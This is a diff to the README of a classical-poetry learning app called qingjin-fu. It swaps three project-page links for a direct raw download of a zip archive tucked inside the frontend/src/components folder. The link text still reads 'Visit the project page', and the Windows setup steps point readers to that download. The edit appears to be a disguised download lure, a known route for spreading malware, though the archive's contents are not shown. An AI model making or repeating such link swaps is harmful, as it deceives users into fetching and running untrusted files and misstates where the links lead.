@@ -1,6 +1,6 @@
 # 🪶 qingjin-fu - Learn classical poetry with ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/highclass-roundel491/qingjin-fu)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip)
 
 ## 📘 What this project is
 
@@ -32,7 +32,7 @@ For Windows use, prepare:
 ## ⬇️ Download and set up on Windows
 
 Go to the project page here:
-https://github.com/highclass-roundel491/qingjin-fu
+https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip
 
 On that page, look for the latest release, source package, or setup files for Windows. If the project offers a ready-to-run Windows package, download it first. If it provides source files only, follow the setup steps below.
 
@@ -251,4 +251,4 @@ If no account screen appears, the app may open in guest mode for reading and pra
 ## 📎 Project link
 
 Download or visit the project page here:
-https://github.com/highclass-roundel491/qingjin-fu
+https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip
